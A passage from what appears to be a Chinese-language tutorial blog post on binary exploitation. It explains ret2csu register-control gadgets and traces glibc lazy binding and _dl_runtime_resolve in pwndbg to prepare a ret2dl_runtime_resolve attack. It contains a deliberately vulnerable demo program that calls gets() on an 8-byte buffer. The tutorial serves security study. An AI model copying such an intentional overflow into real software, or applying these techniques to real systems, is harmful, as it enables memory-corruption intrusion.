class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+
+<p>首先我們先看這段，可以控 rbx, rbp, r12, r13, r14, r15</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br></pre></td></tr></table></figure>
+
+<p>這段可以控<br>r14 -&gt; rdx<br>r13 -&gt; rsi<br>r12 -&gt; edi</p>
+<p>最後call r15+rbx*8 跳到其他位置</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401250 4C 89 F2                      mov     rdx, r14</span><br><span class="line">.text:0000000000401253 4C 89 EE                      mov     rsi, r13</span><br><span class="line">.text:0000000000401256 44 89 E7                      mov     edi, r12d</span><br><span class="line">.text:0000000000401259 41 FF 14 DF                   call    ds:(__frame_dummy_init_array_entry - 403E10h)[r15+rbx*8]</span><br><span class="line">.text:0000000000401259</span><br><span class="line">.text:000000000040125D 48 83 C3 01                   add     rbx, 1</span><br><span class="line">.text:0000000000401261 48 39 DD                      cmp     rbp, rbx</span><br><span class="line">.text:0000000000401264 75 EA                         jnz     short loc_401250</span><br></pre></td></tr></table></figure>
+
+<h2 id="srop"><a href="#srop" class="headerlink" title="srop"></a>srop</h2><p>直接參考我這篇<br><a target="_blank" rel="noopener" href="https://hackmd.io/@naup96321/BJh1D4BHA">https://hackmd.io/@naup96321/BJh1D4BHA</a></p>
+<h2 id="ret2-dl-runtime-resolve"><a href="#ret2-dl-runtime-resolve" class="headerlink" title="ret2 dl_runtime_resolve"></a>ret2 dl_runtime_resolve</h2><p>有時候在沒有適合gadget的時候，可以利用lazy binding時，dl_runtime_resolve解析函數時，通過修改的解析字串符，來達到解析任意函數</p>
+<h3 id="複習一下GOT"><a href="#複習一下GOT" class="headerlink" title="複習一下GOT"></a>複習一下GOT</h3><p>GOT內有很多段</p>
+<ul>
+<li>.dynamic</li>
+<li>.got -&gt; 紀錄用到的全域變數</li>
+<li>.got.plt -&gt; 紀錄函式引用位置</li>
+<li>.data</li>
+</ul>
+<p>got.plt又有三塊</p>
+<table>
+<thead>
+<tr>
+<th>Name</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>address of .dynamic</td>
+<td>指向 GOT 的 .dynamic</td>
+</tr>
+<tr>
+<td>link_map</td>
+<td>一個link list，用來紀錄用到的 Library</td>
+</tr>
+<tr>
+<td>dl_resolve</td>
+<td>找出函式的絕對位置</td>
+</tr>
+</tbody></table>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">------------      -----------------</span><br><span class="line">| .dynamic | &lt;--  | addr .dynamic |</span><br><span class="line">|   .got   |      |    link map   |</span><br><span class="line">| .got.plt | ---  |   dl_resolve  | </span><br><span class="line">|  .data   |      |    printf     |</span><br><span class="line">------------      |     gets      |</span><br><span class="line">                  |    ...        |</span><br></pre></td></tr></table></figure>
+
+<h3 id="追gdb"><a href="#追gdb" class="headerlink" title="追gdb"></a>追gdb</h3><p>一樣開追gdb進去看他lazy binding做了啥</p>
+<h4 id="env"><a href="#env" class="headerlink" title="env"></a>env</h4><p>跑這支binary</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="comment">// gcc demo.c -o demo -z lazy</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">	<span class="type">char</span> buffer[<span class="number">8</span>];</span><br><span class="line">	gets(buffer);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先他先call gets@plt</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x00000000004005b9</span> &lt;+<span class="number">35</span>&gt;:	call   <span class="number">0x400480</span> &lt;gets@plt&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disassemble <span class="number">0x400480</span></span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function gets@plt:</span><br><span class="line">   <span class="number">0x0000000000400480</span> &lt;+<span class="number">0</span>&gt;:	jmp    QWORD PTR [rip+<span class="number">0x200ba2</span>]        # <span class="number">0x601028</span> &lt;gets@got.plt&gt;</span><br><span class="line">   <span class="number">0x0000000000400486</span> &lt;+<span class="number">6</span>&gt;:	push   <span class="number">0x2</span></span><br><span class="line">   <span class="number">0x000000000040048b</span> &lt;+<span class="number">11</span>&gt;:	jmp    <span class="number">0x400450</span></span><br></pre></td></tr></table></figure>
+
+<p>大概可以分成幾個部分</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">跳到gets@got.plt</span><br><span class="line">push 0x2 (offset)</span><br><span class="line">跳到dl resolve</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/Bk1sU2Qp0.png" alt="image"></p>
+<p>這邊先跳到<a href="mailto:&#x67;&#x65;&#116;&#x73;&#x40;&#x67;&#111;&#x74;&#46;&#x70;&#108;&#x74;">&#x67;&#x65;&#116;&#x73;&#x40;&#x67;&#111;&#x74;&#46;&#x70;&#108;&#x74;</a><br>裡面存的是0x400486</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>xg <span class="number">0x601028</span></span><br><span class="line"><span class="number">0x601028</span> &lt;gets@got.plt&gt;:	<span class="number">0x0000000000400486</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+<p>會跳回來gets@plt+0x6<br>並推入0x2這個offset (reloc_arg)<br>之後跳進去dl_runtime_resolve</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>i <span class="number">0x400450</span></span><br><span class="line">   <span class="number">0x400450</span>:	push   QWORD PTR [rip+<span class="number">0x200bb2</span>]        # <span class="number">0x601008</span> &lt;_GLOBAL_OFFSET_TABLE_+<span class="number">8</span>&gt;</span><br><span class="line">   <span class="number">0x400456</span>:	jmp    QWORD PTR [rip+<span class="number">0x200bb4</span>]        # <span class="number">0x601010</span> &lt;_dl_runtime_resolve_xsavec&gt;</span><br></pre></td></tr></table></figure>
+
+<p>0x601000 -&gt; .dynamic section (_GLOBAL_OFFSET_TABLE)<br>0x601008 -&gt; linkmap (_GLOBAL_OFFSET_TABLE+8)<br>0x601010 -&gt; _dl_runtime_resolve (_GLOBAL_OFFSET_TABLE + 0x10)</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>xg <span class="number">0x601008</span></span><br><span class="line"><span class="number">0x601008</span>:	<span class="number">0x00007cdd0d4fb168</span>	<span class="number">0x00007cdd0d2ebf10</span></span><br></pre></td></tr></table></figure>
+
+<p>push了linkmap到stack<br>並跳到 _dl_runtime_resolve_xsave 他用來把 function 真正的 address 填入 GOT<br>具體實作如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">=&gt; <span class="number">0x7cdd0d2ebf10</span> &lt;_dl_runtime_resolve_xsavec&gt;:	push   rbx</span><br><span class="line">   <span class="number">0x7cdd0d2ebf11</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">1</span>&gt;:	mov    rbx,rsp</span><br><span class="line">   <span class="number">0x7cdd0d2ebf14</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">4</span>&gt;:	and    rsp,<span class="number">0xffffffffffffffc0</span></span><br><span class="line">   <span class="number">0x7cdd0d2ebf18</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">8</span>&gt;:	sub    rsp,QWORD PTR [rip+<span class="number">0x20de31</span>]        # <span class="number">0x7cdd0d4f9d50</span> &lt;_rtld_global_ro+<span class="number">176</span>&gt;p+<span class="number">0x250</span>],rdx</span><br><span class="line">   <span class="number">0x7cdd0d2ebf1f</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">15</span>&gt;:	mov    QWORD PTR [rsp],rax</span><br><span class="line">   <span class="number">0x7cdd0d2ebf23</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">19</span>&gt;:	mov    QWORD PTR [rsp+<span class="number">0x8</span>],rcx</span><br><span class="line">   <span class="number">0x7cdd0d2ebf28</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">24</span>&gt;:	mov    QWORD PTR [rsp+<span class="number">0x10</span>],rdx</span><br><span class="line">   <span class="number">0x7cdd0d2ebf2d</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">29</span>&gt;:	mov    QWORD PTR [rsp+<span class="number">0x18</span>],rsi</span><br><span class="line">   <span class="number">0x7cdd0d2ebf32</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">34</span>&gt;:	mov    QWORD PTR [rsp+<span class="number">0x20</span>],rdi</span><br><span class="line">   <span class="number">0x7cdd0d2ebf37</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">39</span>&gt;:	mov    QWORD PTR [rsp+<span class="number">0x28</span>],r8</span><br><span class="line">   <span class="number">0x7cdd0d2ebf3c</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">44</span>&gt;:	mov    QWORD PTR [rsp+<span class="number">0x30</span>],r9</span><br><span class="line">   <span class="number">0x7cdd0d2ebf41</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">49</span>&gt;:	mov    eax,<span class="number">0xee</span></span><br><span class="line">   <span class="number">0x7cdd0d2ebf46</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">54</span>&gt;:	xor    edx,edx</span><br><span class="line">   <span class="number">0x7cdd0d2ebf48</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">56</span>&gt;:	mov    QWORD PTR [rsp+<span class="number">0x250</span>],rdx</span><br><span class="line">   <span class="number">0x7cdd0d2ebf50</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">64</span>&gt;:	mov    QWORD PTR [rsp+<span class="number">0x258</span>],rdx</span><br><span class="line">   <span class="number">0x7cdd0d2ebf58</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">72</span>&gt;:	mov    QWORD PTR [rsp+<span class="number">0x260</span>],rdx</span><br><span class="line">   <span class="number">0x7cdd0d2ebf60</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">80</span>&gt;:	mov    QWORD PTR [rsp+<span class="number">0x268</span>],rdx</span><br><span class="line">   <span class="number">0x7cdd0d2ebf68</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">88</span>&gt;:	mov    QWORD PTR [rsp+<span class="number">0x270</span>],rdx</span><br><span class="line">   <span class="number">0x7cdd0d2ebf70</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">96</span>&gt;:	mov    QWORD PTR [rsp+<span class="number">0x278</span>],rdx</span><br><span class="line">   <span class="number">0x7cdd0d2ebf78</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">104</span>&gt;:	xsavec [rsp+<span class="number">0x40</span>]</span><br><span class="line">   <span class="number">0x7cdd0d2ebf7d</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">109</span>&gt;:	mov    rsi,QWORD PTR [rbx+<span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x7cdd0d2ebf81</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">113</span>&gt;:	mov    rdi,QWORD PTR [rbx+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x7cdd0d2ebf85</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">117</span>&gt;:	call   <span class="number">0x7cdd0d2e3a30</span> &lt;_dl_fixup&gt;</span><br><span class="line">   <span class="number">0x7cdd0d2ebf8a</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">122</span>&gt;:	mov    r11,rax</span><br><span class="line">   <span class="number">0x7cdd0d2ebf8d</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">125</span>&gt;:	mov    eax,<span class="number">0xee</span></span><br><span class="line">   <span class="number">0x7cdd0d2ebf92</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">130</span>&gt;:	xor    edx,edx</span><br><span class="line">   <span class="number">0x7cdd0d2ebf94</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">132</span>&gt;:	xrstor [rsp+<span class="number">0x40</span>]</span><br><span class="line">   <span class="number">0x7cdd0d2ebf99</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">137</span>&gt;:	mov    r9,QWORD PTR [rsp+<span class="number">0x30</span>]</span><br><span class="line">   <span class="number">0x7cdd0d2ebf9e</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">142</span>&gt;:	mov    r8,QWORD PTR [rsp+<span class="number">0x28</span>]</span><br><span class="line">   <span class="number">0x7cdd0d2ebfa3</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">147</span>&gt;:	mov    rdi,QWORD PTR [rsp+<span class="number">0x20</span>]</span><br><span class="line">   <span class="number">0x7cdd0d2ebfa8</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">152</span>&gt;:	mov    rsi,QWORD PTR [rsp+<span class="number">0x18</span>]</span><br><span class="line">   <span class="number">0x7cdd0d2ebfad</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">157</span>&gt;:	mov    rdx,QWORD PTR [rsp+<span class="number">0x10</span>]</span><br><span class="line">   <span class="number">0x7cdd0d2ebfb2</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">162</span>&gt;:	mov    rcx,QWORD PTR [rsp+<span class="number">0x8</span>]</span><br><span class="line">   <span class="number">0x7cdd0d2ebfb7</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">167</span>&gt;:	mov    rax,QWORD PTR [rsp]</span><br><span class="line">   <span class="number">0x7cdd0d2ebfbb</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">171</span>&gt;:	mov    rsp,rbx</span><br><span class="line">   <span class="number">0x7cdd0d2ebfbe</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">174</span>&gt;:	mov    rbx,QWORD PTR [rsp]</span><br><span class="line">   <span class="number">0x7cdd0d2ebfc2</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">178</span>&gt;:	add    rsp,<span class="number">0x18</span></span><br><span class="line">   <span class="number">0x7cdd0d2ebfc6</span> &lt;_dl_runtime_resolve_xsavec+<span class="number">182</span>&gt;:	bnd jmp r11</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>他將register的值存到stack上</p>
+<p>並將rsi設為offset<br><img src="https://hackmd.io/_uploads/ry6pa3X6R.png" alt="image"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>xg <span class="number">0x7ffc0454e910</span>+<span class="number">0x10</span></span><br><span class="line"><span class="number">0x7ffc0454e920</span>:	<span class="number">0x0000000000000002</span></span><br></pre></td></tr></table></figure>
+
+<p>rdi設為linkmap<br><img src="https://hackmd.io/_uploads/H1zsC3ma0.png" alt="image"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10xg 0x7ffc0454e910+0x8</span><br><span class="line">0x7ffc0454e918:	0x00007cdd0d4fb168	0x0000000000000002</span><br></pre></td></tr></table></figure>
+
+<p>並call _dl_fixup<br><code>_dl_fixup(l，reloc_arg)</code><br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/dl-runtime.c#L61">https://elixir.bootlin.com/glibc/glibc-2.31/source/elf/dl-runtime.c#L61</a><br>他會尋找函式庫具體的位置並填入到GOT中<br>詳細解釋在下面</p>
+<p>最後call<br><code>elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value)</code><br>將GOT填入function在libc的位置<br>這樣就寫入成功了，跑完剩下的xsave就進入到libc gets function內部</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">10</span>xg <span class="number">0x601028</span></span><br><span class="line"><span class="number">0x601028</span> &lt;gets@got.plt&gt;:	<span class="number">0x00007cdd0cf78d90</span>	<span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.io/_uploads/rk7JV6XTR.png" alt="image"></p>
+<h3 id="fixup詳細展開"><a href="#fixup詳細展開" class="headerlink" title="fixup詳細展開"></a>fixup詳細展開</h3><p>看完上方lazy binding過程，不難理解  _dl_runtime_resolve_xsave 之前跟最後填表，比較複雜的是fixup</p>
+<p>先來看看linkmap是啥<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.37/source/include/link.h#L95">https://elixir.bootlin.com/glibc/glibc-2.37/source/include/link.h#L95</a></p>
+<p>關注到 l_info，他指向 ElfW(Dyn) 也就是 .dynamic</p>
+<p>這邊回去關注到 .dynamic<br><a target="_blank" rel="noopener" href="https://elixir.bootlin.com/glibc/glibc-2.37/source/elf/elf.h#L849">https://elixir.bootlin.com/glibc/glibc-2.37/source/elf/elf.h#L849</a></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Dynamic section entry.  */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Sword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf32_Word d_val;			<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf32_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf32_Dyn;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>
+<p>還有一堆tag</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Legal values for d_tag (dynamic entry type).  */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NULL		0		<span class="comment">/* Marks end of dynamic section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_NEEDED	1		<span class="comment">/* Name of needed library */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTRELSZ	2		<span class="comment">/* Size in bytes of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTGOT	3		<span class="comment">/* Processor defined value */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_HASH		4		<span class="comment">/* Address of symbol hash table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRTAB	5		<span class="comment">/* Address of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB	6		<span class="comment">/* Address of symbol table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELA		7		<span class="comment">/* Address of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELASZ	8		<span class="comment">/* Total size of Rela relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELAENT	9		<span class="comment">/* Size of one Rela reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_STRSZ	10		<span class="comment">/* Size of string table */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMENT	11		<span class="comment">/* Size of one symbol table entry */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_INIT		12		<span class="comment">/* Address of init function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FINI		13		<span class="comment">/* Address of termination function */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SONAME	14		<span class="comment">/* Name of shared object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RPATH	15		<span class="comment">/* Library search path (deprecated) */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMBOLIC	16		<span class="comment">/* Start symbol search here */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_REL		17		<span class="comment">/* Address of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELSZ	18		<span class="comment">/* Total size of Rel relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELENT	19		<span class="comment">/* Size of one Rel reloc */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PLTREL	20		<span class="comment">/* Type of reloc in PLT */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_DEBUG	21		<span class="comment">/* For debugging; unspecified */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_TEXTREL	22		<span class="comment">/* Reloc might modify .text */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_JMPREL	23		<span class="comment">/* Address of PLT relocs */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	DT_BIND_NOW	24		<span class="comment">/* Process relocations of object */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	DT_INIT_ARRAY	25		<span class="comment">/* Array with addresses of init fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	DT_FINI_ARRAY	26		<span class="comment">/* Array with addresses of fini fct */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	DT_INIT_ARRAYSZ	27		<span class="comment">/* Size in bytes of DT_INIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	DT_FINI_ARRAYSZ	28		<span class="comment">/* Size in bytes of DT_FINI_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RUNPATH	29		<span class="comment">/* Library search path */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_FLAGS	30		<span class="comment">/* Flags for the object being loaded */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_ENCODING	32		<span class="comment">/* Start of encoded range */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PREINIT_ARRAY 32		<span class="comment">/* Array with addresses of preinit fct*/</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_PREINIT_ARRAYSZ 33		<span class="comment">/* size in bytes of DT_PREINIT_ARRAY */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_SYMTAB_SHNDX	34		<span class="comment">/* Address of SYMTAB_SHNDX section */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELRSZ	35		<span class="comment">/* Total size of RELR relative relocations */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELR		36		<span class="comment">/* Address of RELR relative relocations */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_RELRENT	37		<span class="comment">/* Size of one RELR relative relocaction */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span>	DT_NUM		38		<span class="comment">/* Number used */</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DT_LOOS		0x6000000d	<span class="comment">/* Start of OS-specific */</span></span></span><br><span 